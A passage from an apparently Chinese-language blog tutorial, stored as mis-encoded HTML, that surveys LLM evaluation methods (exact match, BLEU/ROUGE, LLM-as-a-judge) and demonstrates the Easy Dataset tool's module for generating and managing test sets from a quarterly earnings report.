åœ¨æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æ¶æ„ä¸­ï¼Œæ¨¡å‹æ˜¯å¦å‡†ç¡®åˆ©ç”¨äº†æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡ï¼Ÿæ˜¯å¦å­˜åœ¨å¹»è§‰ï¼Ÿè¿™éœ€è¦é’ˆå¯¹æ€§çš„è¯„ä¼°æŒ‡æ ‡ã€‚</p>
</li>
</ul>
<h3 data-id="heading-2">2. ä¸»æµçš„è¯„ä¼°æ–¹æ³•</h3>
<p>ä¼ ç»Ÿçš„å‚ç›´é¢†åŸŸè¯„ä¼°é€šå¸¸éœ€è¦ â€œæ‡‚è¡Œçš„äººâ€ æ¥é˜…å·ã€‚ä½†æ˜¯ï¼Œè¡Œä¸šä¸“å®¶çš„å·¥ä½œæ—¶é—´æ˜¯æå…¶æ˜‚è´µçš„ï¼Œå‡ åæ¡æ•°æ®è¿˜èƒ½çœ‹ï¼Œæˆåƒä¸Šä¸‡æ¡æ•°æ®é çº¯äººå·¥å°±ä¸å¤ªç°å®äº†ã€‚</p>
<p>è€Œä¸”äººçš„ä¸»è§‚æ ‡å‡†å˜åŠ¨å¾ˆå¤§ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªæ–‡æ¡ˆæ˜¯â€œå‡†ç¡®â€è¿˜æ˜¯â€œç”ŸåŠ¨â€ï¼Ÿè¿™ç§ä¸»è§‚æ€§ä¼šå¯¼è‡´è¯„ä¼°ç»“æœæ³¢åŠ¨å¤§ï¼Œéš¾ä»¥ä½œä¸ºæ¨¡å‹å¯¹æ¯”çš„ç¡¬æŒ‡æ ‡ã€‚</p>
<p>åœ¨çœŸå®çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œæ¨¡å‹åœ¨ç‰¹å®šé¢†åŸŸè¡¨ç°çš„è¯„ä¼°é€šå¸¸é ä»¥ä¸‹å‡ ç±»è¯„ä¼°æ–¹æ³•ï¼š</p>
<h4 data-id="heading-3">æ–¹æ¡ˆä¸€ï¼šç¡®å®šæ€§è¯„ä¼°</h4>
<p>æ ‡å‡†ç­”æ¡ˆå’Œæ¨¡å‹å›ç­”çš„å®Œå…¨åŒ¹é…æ˜¯æœ€ç›´æ¥ã€æˆæœ¬æœ€ä½çš„æ–¹å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de01379e7b546968b719cee7290a5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=3QdSqpHJSuGqgYafLeWuGKLy41g%3D" alt="" loading="lazy"/></p>
<p>è¿™ç±»è¯„ä¼°åªèƒ½é™åˆ¶åœ¨æŸäº›ç‰¹å®šçš„é¢˜ç›®ç±»å‹ä¸Šï¼Œå°±åƒæˆ‘ä»¬åœ¨è€ƒè¯•çš„æ—¶å€™åšçš„åˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜ã€‚</p>
<p>å®ƒä»¬çš„ç­”æ¡ˆæ˜¯å›ºå®šçš„ï¼Œéé»‘å³ç™½ï¼Œæ˜¯å¦å¾—åˆ†è¿˜æ˜¯å¾ˆå¥½è¯„ä¼°çš„ã€‚</p>
<p>ä½†æ˜¯ï¼Œæ­¤ç±»æ•°æ®é›†çš„åˆ¶å®šè¿˜æ˜¯æœ‰ä¸€å®šæˆæœ¬çš„ï¼Œé€šç”¨è¯„ä¼°é›†ï¼ˆå¦‚ MMLUï¼‰æ¶µç›–é¢å¹¿ä½†æ·±åº¦ä¸è¶³ã€‚é’ˆå¯¹ç‰¹å®šä¸šåŠ¡çš„ã€åŒ…å«æ ‡å‡†ç­”æ¡ˆçš„é«˜è´¨é‡é¢˜åº“éå¸¸ç¨€ç¼ºï¼Œå¾€å¾€éœ€è¦èµ„æ·±ä¸“å®¶æ‰‹å·¥ç¼–å†™ï¼Œæ•ˆç‡æä½ã€‚</p>
<h4 data-id="heading-4">æ–¹æ¡ˆäºŒï¼šåŸºäºç»Ÿè®¡çš„æ–‡æœ¬ç›¸ä¼¼åº¦</h4>
<p>æ¯”å¦‚æˆ‘ä»¬ç»å¸¸å¬åˆ°çš„ <code>BLEU</code>ã€<code>ROUGE</code>ã€<code>METEOR</code> è¿™äº›æŒ‡æ ‡æ˜¯è‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰é¢†åŸŸæœ€å¸¸ç”¨çš„è‡ªåŠ¨æ–‡æœ¬ç”Ÿæˆè¯„ä¼°æŒ‡æ ‡ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯é‡åŒ–æœºå™¨ç”Ÿæˆæ–‡æœ¬ï¼ˆå¦‚ç¿»è¯‘ã€æ‘˜è¦ã€å¯¹è¯å›å¤ï¼‰ä¸äººå·¥æ ‡æ³¨çš„å‚è€ƒæ–‡æœ¬ä¹‹é—´çš„ç›¸ä¼¼åº¦ï¼Œåˆ¤æ–­ç”Ÿæˆç»“æœçš„è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51db7177823d45b0a02541728013814c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=kC4vu%2BGUp6bYI86CgS9oGbsMtUg%3D" alt="" loading="lazy"/></p>
<p>è¿™ç±»æŒ‡æ ‡è®¡ç®—çš„æœ¬è´¨ä¸Šéƒ½æ˜¯ç”Ÿæˆæ–‡æœ¬ä¸å‚è€ƒæ–‡æœ¬çš„è¯æ±‡é‡å åº¦ã€‚åœ¨ LLM æ—¶ä»£ï¼Œæ„æ€ç›¸åŒä½†è¡¨è¾¾æ–¹å¼ä¸åŒçš„æƒ…å†µæ˜¯éå¸¸æ™®éçš„ï¼ˆæ ‡å‡†ç­”æ¡ˆæ˜¯ â€œåˆ©ç‡ä¸Šè°ƒâ€ï¼Œæ¨¡å‹å›ç­” â€œåŠ æ¯â€ã€‚å­—é¢ä¸Šæ²¡é‡åˆï¼Œå¾—åˆ†å¾ˆä½ï¼Œä½†æ„æ€å®Œå…¨ä¸€æ ·ã€‚ï¼‰ï¼Œæ‰€ä»¥å‚è€ƒä»·å€¼ä¸å¤§äº†ã€‚</p>
<p>åœ¨å‚ç›´é¢†åŸŸçŸ¥è¯†è¯„ä¼°ä¸­ï¼Œè¿™ç±»æŒ‡æ ‡çš„æƒé‡æ­£åœ¨è¢«å¤§å¹…é™ä½ï¼Œå› ä¸ºå®ƒä»¬å¾ˆå®¹æ˜“è¯¯æ€å¥½æ¨¡å‹ã€‚</p>
<h4 data-id="heading-5">æ–¹æ¡ˆä¸‰ï¼šåŸºäºæ¨¡å‹çš„è¯­ä¹‰è¯„ä¼°</h4>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸ŠæœŸæ•™ç¨‹ä¸­æåˆ°çš„ <code>LLM as a Judge</code>ã€‚</p>
<p>è¿™æ˜¯ç›®å‰æå¼€æ”¾å¼é—®ç­”çš„æœ€ä¼˜è§£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0321e2150ece4d14adc588feb6a9bf0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=em%2FNcB21L%2FUXEALvFwE9RIp2tu4%3D" alt="" loading="lazy"/></p>
<p>æ ¸å¿ƒé€»è¾‘ï¼šç”¨ä¸€ä¸ªæ›´å¼ºã€æ›´èªæ˜çš„æ¨¡å‹ï¼ˆæ¯”å¦‚ <code>GPT-5</code>ï¼‰å½“è£åˆ¤ï¼Œå»ç»™ä¸šåŠ¡æ¨¡å‹ï¼ˆæ¯”å¦‚ <code>Qwen3-7B</code> çš„å°æ¨¡å‹ï¼‰æ‰“åˆ†ã€‚</p>
<p>æ­¤ç±»è¯„ä¼°çš„å…³é”®ä¸åœ¨æµç¨‹ï¼Œè€Œæ˜¯è¯„åˆ†ç»†åˆ™ï¼ˆPromptï¼‰ï¼Œä¸åŒç±»å‹çš„æ•°æ®é›†é€šå¸¸éœ€è¦åˆ¶å®šç‰¹å®šçš„è¯„ä¼°æ ‡å‡†ã€‚</p>
<h3 data-id="heading-6">3. çœŸå®å·¥ä½œä¸­é¢ä¸´çš„ç—›ç‚¹</h3>
<p>åœ¨çœŸå®çš„è¯„ä¼°å·¥ä½œä¸­ï¼Œæˆ‘ä»¬å¾€å¾€é¢ä¸´ç€ä»¥ä¸‹ç—›ç‚¹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a07537b47624439a38612a0b6d689d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=GdOHQ1UlNgcM0X8H%2Bl0USGEOA3Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>æµ‹è¯•é›†éš¾æ„é€ ï¼šå’Œæ¨¡å‹å¾®è°ƒè®­ç»ƒé¢ä¸´çš„é—®é¢˜ä¸€æ ·ï¼Œä¼ä¸šé‡Œæœ‰æµ·é‡çš„ PDF æ‰‹å†Œã€Markdown æŠ€æœ¯æ–‡æ¡£ï¼Œä½†æ²¡æœ‰ç°æˆçš„ QA å¯¹ï¼ˆé—®ç­”å¯¹ï¼‰ã€‚è¦è¯„ä¼°æ¨¡å‹ï¼Œé¦–å…ˆå¾—æŠŠéç»“æ„åŒ–çš„æ–‡æ¡£å˜æˆç»“æ„åŒ–çš„æµ‹è¯•é›†ã€‚</p>
</li>
<li>
<p>å®šæ€§å®¹æ˜“ï¼Œå®šé‡éš¾ï¼šå¤§å®¶å¸¸è¯´â€œè¿™ä¸ªæ¨¡å‹æ„Ÿè§‰æ¯”é‚£ä¸ªå¥½â€ã€‚ä½†åœ¨å·¥ç¨‹ä¸Šï¼Œâ€œæ„Ÿè§‰â€æ˜¯ä¸å€¼é’±çš„ã€‚æˆ‘ä»¬éœ€è¦å…·ä½“çš„æŒ‡æ ‡ â€” æ˜¯å¬å›ç‡æå‡äº†ï¼Ÿè¿˜æ˜¯å¹»è§‰ç‡ä¸‹é™äº†ï¼Ÿæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€å¥—å¯é‡åŒ–çš„æŒ‡æ ‡ï¼Œå¹¶ä¸”å¯ä»¥ç›´è§‚çš„è§‚æµ‹ã€‚</p>
</li>
<li>
<p>è‡ªåŠ¨åŒ–ä¸äººå·¥çš„å‰²è£‚ï¼šå®Œå…¨é äººå·¥æµ‹ï¼Œæµ‹ä¸åŠ¨ï¼›å®Œå…¨é è„šæœ¬æµ‹ï¼Œä¸å‡†ï¼ˆå°¤å…¶æ˜¯é•¿æ–‡æœ¬ç”Ÿæˆï¼‰ã€‚å¦‚ä½•æŠŠ â€œè‡ªåŠ¨åŒ–çš„è§„æ¨¡â€ å’Œ â€œäººå·¥çš„ç²¾å‡†â€ ç»“åˆèµ·æ¥ï¼Œæ˜¯ä¸€ä¸ªæ™®éæ€§éš¾é¢˜ã€‚</p>
</li>
</ul>
<h2 data-id="heading-7">ç¬¬äºŒéƒ¨åˆ†ï¼šå®æˆ˜ç¯‡</h2>
<p>åœ¨å®æˆ˜ç« èŠ‚ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€æ¬¾å·¥å…·ï¼ˆ<code>Easy Dataset</code>ï¼‰è§£å†³ä»¥ä¸Šç—›ç‚¹ã€‚</p>
<blockquote>
<p>Easy Dataset æ˜¯ä¸€ä¸ªä¸“ä¸ºåˆ›å»ºå¤§å‹è¯­è¨€æ¨¡å‹æ•°æ®é›†è€Œè®¾è®¡çš„åº”ç”¨ç¨‹åºã€‚é€šè¿‡ Easy Datasetï¼Œä½ å¯ä»¥å°†é¢†åŸŸçŸ¥è¯†è½¬åŒ–ä¸ºç»“æ„åŒ–æ•°æ®é›†ï¼Œå…¼å®¹æ‰€æœ‰éµå¾ª OpenAI æ ¼å¼çš„ LLM APIï¼Œä½¿æ•°æ®é›†æ„é€ è¿‡ç¨‹å˜å¾—ç®€å•é«˜æ•ˆï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset%2F" target="_blank" title="https://github.com/ConardLi/easy-dataset/" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></p>
</blockquote>
<p>åœ¨ï¼Œ<code>Easy Dataset</code> çš„ 1.7.0 ç‰ˆæœ¬ï¼Œæ”¯æŒäº†å…¨æ–°çš„ â€œè¯„ä¼°â€ æ¨¡å—ï¼Œèƒ½å¤Ÿåšåˆ° <strong>è‡ªåŠ¨åŒ–ç”Ÿæˆæµ‹è¯•é›†</strong> + <strong>ä½æˆæœ¬çš„åˆ›å»ºè¯„ä¼°ä»»åŠ¡</strong> + <strong>å¯è§†åŒ–çš„è¯„ä¼°ç»“æœ</strong>ã€‚</p>
<h3 data-id="heading-8">1.è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰ç”Ÿæˆ</h3>
<blockquote>
<p><strong>è¯„ä¼°æ•°æ®é›†æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰æ˜¯ä¸€ç»„â€œé¢˜ç›® + æ ‡å‡†ç­”æ¡ˆ/å‚è€ƒç­”æ¡ˆ + è¯„åˆ†è§„åˆ™/é€‰é¡¹â€çš„é›†åˆã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥ï¼šåšä¸åŒæ¨¡å‹çš„å¯¹æ¯”è¯„ä¼°ï¼Œé•¿æœŸè¿½è¸ªæ•ˆæœå˜åŒ–ã€‚</li>
</ul>
</blockquote>
<h4 data-id="heading-9">é¢˜ç›®ç±»å‹</h4>
<p>ä¸€ä¸ªå¥½çš„æ¨¡å‹è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰æ˜¯è¡¡é‡æ¨¡å‹çœŸå®èƒ½åŠ›çš„åŸºçŸ³ã€‚åœ¨ <code>Easy Dataset</code> ä¸­ï¼Œè¯„ä¼°é›†ä¸ä»…ä»…æ˜¯é—®é¢˜çš„é›†åˆï¼Œæ›´æ˜¯åŒ…å«æ ‡å‡†ç­”æ¡ˆã€è€ƒç‚¹æ ‡ç­¾å’Œä¸šåŠ¡é€»è¾‘çš„ç»¼åˆçŸ¥è¯†åº“ã€‚</p>
<p>ä¸ºäº†å…¨é¢è€ƒå¯Ÿæ¨¡å‹èƒ½åŠ›ï¼Œæˆ‘ä»¬è®¾è®¡äº†äº”ç§é¢˜å‹ï¼š</p>
<ul>
<li><strong>åˆ¤æ–­é¢˜ï¼š</strong>
è¿™æ˜¯æœ€ç›´æ¥çš„ã€‚è€ƒå¯Ÿæ¨¡å‹å¯¹æ ¸å¿ƒäº‹å®æ˜¯å¦ææ··ã€‚æ¯”å¦‚æ–‡æ¡£é‡Œè¯´â€œæ¸©åº¦ä¸èƒ½è¶…è¿‡ 100 åº¦â€ï¼Œé¢˜ç›®é—®â€œæ¸©åº¦æ˜¯å¦å¯ä»¥è¾¾åˆ° 105 åº¦ï¼Ÿâ€ï¼Œèƒ½æœ‰æ•ˆæ£€æµ‹å¹»è§‰ã€‚</li>
<li><strong>å•é€‰é¢˜ï¼š</strong>
4ä¸ªé€‰é¡¹ï¼ˆA-Dï¼‰ï¼Œå•é€‰ç­”æ¡ˆ | è€ƒå¯Ÿæ¨¡å‹åœ¨å¹²æ‰°é¡¹ä¸‹çš„çŸ¥è¯†æå–å’Œè¾¨æèƒ½åŠ›ã€‚</li>
<li><strong>å¤šé€‰é¢˜ï¼š</strong>
å¤šä¸ªé€‰é¡¹ï¼Œç­”æ¡ˆä¸ºå­—æ¯æ•°ç»„ï¼ˆå¦‚ <code>["A", "C"]</code>ï¼‰ | æå…·æŒ‘æˆ˜æ€§ï¼Œæ¼æ‰ä¸€ä¸ªä¿¡æ¯ç‚¹å°±é€‰ä¸å¯¹ã€‚</li>
<li><strong>ç®€ç­”é¢˜ï¼ˆçŸ­ç­”æ¡ˆï¼‰ï¼š</strong>
æä¾›æ ‡å‡†çŸ­ç­”æ¡ˆï¼ˆ20å­—ä»¥å†…ï¼‰ï¼Œå¯æµ‹è¯•æ¨¡å‹è·å–æ ¸å¿ƒçŸ¥è¯†ç‚¹å¹¶ç²¾ç®€è¡¨è¾¾çš„èƒ½åŠ›ã€‚å¦‚ï¼š2025 å¹´ç¾å›¢çš„è¥æ”¶æ˜¯å¤šå°‘äº¿ï¼Ÿ</li>
<li><strong>å¼€æ”¾é¢˜ï¼ˆé•¿ç­”æ¡ˆï¼‰ï¼š</strong>
è€ƒå¯Ÿæ¨ç†å’Œæ€»ç»“èƒ½åŠ›ã€‚æ¯”å¦‚â€œæ ¹æ®æ–‡æ¡£æè¿°ï¼Œåˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå‡ºç°è®¾å¤‡å¼‚å“ï¼Ÿâ€ã€‚è¿™ç§é¢˜æ²¡æœ‰æ ‡å‡†æ­»ç­”æ¡ˆï¼Œæœ€è€ƒéªŒæ¨¡å‹çš„é€»è¾‘ã€‚</li>
</ul>
<p>å¹¶ä¸”ï¼Œåœ¨ä»»åŠ¡é…ç½®ä¸­ <strong>æ”¯æŒé…ç½®å„é¢˜ç›®ç±»å‹ç”Ÿæˆçš„æ¯”ä¾‹</strong>ï¼ˆæ¯”å¦‚ï¼šæˆ‘è¦ 30% çš„åˆ¤æ–­é¢˜ç”¨äºæµ‹å¹»è§‰ï¼Œ70% çš„ç®€ç­”é¢˜æµ‹ç†è§£ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4caf47bc3d2d454c929f79a566ace467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=iY%2Bvke5A8lT%2BeKtDKe8lY8Rp2ms%3D" alt="" loading="lazy"/></p>
<p>åœ¨ <code>Easy Dataset</code> ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ç”Ÿæˆå’Œé…ç½®è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰ï¼š</p>
<ul>
<li>ä»é¢†åŸŸæ–‡çŒ®ä¸­æå–æµ‹è¯•é›†</li>
<li>ä»è®­ç»ƒé›†æ·»åŠ æˆ–ç”Ÿæˆæµ‹è¯•é›†å˜ä½“</li>
<li>å¯¼å…¥è‡ªå®šä¹‰/å¹³å°å†…ç½®æµ‹è¯•é›†</li>
</ul>
<h4 data-id="heading-10">ä»é¢†åŸŸæ–‡çŒ®ç”Ÿæˆæµ‹è¯•é›†</h4>
<p>ä¸ç®¡æ˜¯ PDF è¿˜æ˜¯ Docx æ ¼å¼çš„é¢†åŸŸæ–‡çŒ®ï¼Œç³»ç»Ÿæ”¯æŒç›´æ¥å¯¼å…¥ã€‚åå°ä¼šæŠŠè¿™äº›é•¿æ–‡æœ¬åˆ‡åˆ†æˆå°å—ï¼ˆChunkï¼‰ï¼Œç„¶åé€šè¿‡æç¤ºè¯å·¥ç¨‹ï¼Œè®©å¤§æ¨¡å‹åŸºäºè¿™äº›æ–‡æœ¬å—è‡ªåŠ¨ç”Ÿæˆé¢˜ç›®ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆæ¥åˆ°ã€æ•°æ®æº-æ–‡çŒ®å¤„ç†ã€‘æ¨¡å—ï¼Œå¯¼å…¥ä¸€ä»½å°ç±³ 2025 Q3 å­£åº¦çš„è´¢æŠ¥æ–‡æ¡£ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90562dd550c84b85a6946ee78125c6a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=AHYf6ZDksSDmAsYuMGGsMKcrW7s%3D" alt="" loading="lazy"/></p>
<p>ç³»ç»Ÿè§£æå®Œæˆåï¼Œä¼šå¯¹æ–‡æ¡£è¿›è¡Œè‡ªåŠ¨åˆ‡å—ï¼Œä¸ºäº†ä¿è¯åç»­åœ¨æ–‡æœ¬å—ä¸Šç”Ÿæˆçš„æµ‹è¯•é›†æ›´ç¬¦åˆä¸»é¢˜ï¼Œæˆ‘ä»¬æ‰¹é‡ç¼–è¾‘æ–‡æœ¬å—ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c9e8ffb19348699b70cf9756b0b38c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7ZrydmqV2xzrV1C%2Bz%2Bv9Szjq0qg%3D" alt="" loading="lazy"/></p>
<p>åœ¨æ¯ä¸ªæ–‡æœ¬å—çš„å¼€å¤´å¢åŠ å…¨å±€æ‘˜è¦ä¿¡æ¯ï¼š</p>
<blockquote>
<p>å…¨å±€æ‘˜è¦ï¼šå½“å‰æ–‡æœ¬ä¸º <strong>å°ç±³é›†å›¢</strong> 2025 Q3 å­£åº¦çš„è´¢æŠ¥æ–‡æ¡£çš„ä¸€éƒ¨åˆ†ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab2aec2441f84ee2ab986481394a84bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=zI4XAXtW9Zf3nABmDArQ3kwJ9J0%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åŸºäºå•ä¸ªæ–‡æœ¬å—ç”Ÿæˆæµ‹è¯•é›†ï¼Œæˆ–è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•é›†ï¼ˆåå°è‡ªåŠ¨è¯»å–å¹¶å¤„ç†æœªç”Ÿæˆæµ‹è¯•é›†çš„æ–‡æœ¬å—ï¼‰ï¼Œç³»ç»Ÿå°†æ ¹æ®æˆ‘ä»¬å‰é¢åœ¨é¡¹ç›®è®¾ç½®ä¸­è®¾ç½®çš„å‡ ç§é¢˜ç›®ç±»å‹çš„æ¯”ä¾‹è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•é¢˜ç›®ï¼ˆé»˜è®¤çš„é¢˜ç›®ç±»å‹åˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜ã€ç®€ç­”é¢˜ã€å¼€æ”¾é¢˜ä¸º <code>1:1:1:1:1</code>ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfe29455c2f482faf2aa9c72960257e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=38O7Sa%2FwAIk7XMvdO49GQL8cszM%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å»ºè®®ï¼š</p>
<ul>
<li>å…ˆç”¨ â€œå•ä¸ªç”Ÿæˆâ€ è·‘é€šæµç¨‹ï¼Œç¡®è®¤é¢˜å‹è´¨é‡ä¸æœŸæœ›ä¸€è‡´ï¼Œåœ¨æ‰§è¡Œè‡ªåŠ¨ç”Ÿæˆä»»åŠ¡ã€‚</li>
<li>æ¯”ä¾‹é…ç½®å…ˆä»ä¿å®ˆå¼€å§‹ï¼šå¼€æ”¾é¢˜æ¯”ä¾‹ä¸è¦å¤ªé«˜ï¼ˆåç»­æ•™å¸ˆæ¨¡å‹è¯„ä¼°æˆæœ¬æ›´é«˜ï¼‰</li>
</ul>
</blockquote>
<h4 data-id="heading-11">æµ‹è¯•é¢˜ç®¡ç†</h4>
<p>ç‚¹å‡»æ¯ä¸ªæ–‡æœ¬å—ä¸Šçš„ <strong>å·²ç”Ÿæˆæµ‹è¯•é¢˜</strong> æ ‡ç­¾ï¼Œæˆ‘ä»¬å°†è·³è½¬è‡³ã€è¯„ä¼°-è¯„ä¼°æ•°æ®é›†ã€‘æ¨¡å—ï¼Œåœ¨è¿™é‡Œä½ å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆçš„æ‰€æœ‰æ•°æ®é›†ï¼Œä½ å¯ä»¥æ ¹æ®é¢˜ç›®ç±»å‹ã€é¢˜ç›®å†…å®¹å’Œæ ‡ç­¾è¿›è¡Œç­›é€‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47463c166c3e4f2e98f879ccaa8a9c01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=DGPOrlZm1l27TydSuV5UjqedZOo%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»å•ä¸ªé¢˜ç›®ï¼Œå¯ä»¥æŸ¥çœ‹é¢˜ç›®è¯¦æƒ…ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54881f7c153e48798b7af126dc9d1a80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cgH9SPYF5gQ3u6lQeZPB8h1EEp8%3D" alt="" loading="lazy"/></p>
<p>é—®é¢˜ã€é€‰é¡¹ã€ç­”æ¡ˆéƒ½å¯ä»¥è‡ªç”±ç¼–è¾‘ï¼Œä½ ä¹Ÿå¯ä»¥å¯¹é¢˜ç›®è¿›è¡Œæ‰“æ ‡ç­¾ã€å¤‡æ³¨ã€åˆ é™¤ç­‰ç­‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/601f7268a08c4162aae0a03954caf8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Hf9S4DEsIANWf1C0%2BiI0p6OXJYQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">ä»æ•°æ®é›†æ·»åŠ </h4>
<p>åœ¨ä»¥å‰çš„é¡¹ç›®ä¸­ï¼Œä½ å¯èƒ½å·²ç»ä½¿ç”¨  <code>Easy Dataset</code> ç”Ÿæˆè¿‡æ•°æ®é›†ï¼ˆè®­ç»ƒé›†ï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿæ”¯æŒç›´æ¥ä»å·²æœ‰æ•°æ®é›†ä¸Šæ ‡æ³¨å’Œç”Ÿæˆæµ‹è¯•é›†ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ°ã€æ•°æ®é›†-å•è®ºé—®ç­”æ•°æ®é›†ã€‘æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°ä¹‹å‰ç”Ÿæˆè¿‡çš„æ•°æ®é›†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab7f5c6b253847b6b2cb2029e73953f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=LJXud%2BgUF6YYSgoBIKx0IUgW8W0%3D" alt="" loading="lazy"/></p>
<p>è¿›å…¥æ•°æ®é›†è¯¦æƒ…é¡µï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰æ•°æ®é›†æ·»åŠ åˆ°è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰ï¼ŒåŒæ—¶ï¼Œç³»ç»Ÿç»™åŸæ•°æ®é›†æ‰“ä¸Š Eval æ ‡ç­¾ï¼ˆç”¨äºåç»­ç­›é€‰/è¯†åˆ«ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1bd7191b4e4847873538eca6f50a2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=I5M%2FqOumePsJevUG4CjelNgzbzs%3D" alt="" loading="lazy"/></p>
